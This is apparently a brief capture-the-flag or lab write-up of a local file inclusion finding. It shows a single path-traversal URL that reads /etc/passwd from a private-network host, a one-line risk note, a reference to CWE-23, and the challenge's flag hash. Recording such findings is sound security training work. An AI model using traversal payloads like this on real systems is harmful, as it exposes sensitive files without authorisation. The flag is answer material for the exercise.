## Local file inclusion

`http://10.13.247.192/index.php?page=../../../../../../../etc/passwd`

It might allow attackers to read sensitive information, access configuration files or even execute system commands remotely.

## CWE

**CWE-23**: Relative Path Traversal: `https://cwe.mitre.org/data/definitions/23.html`

**Flag**: `b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0`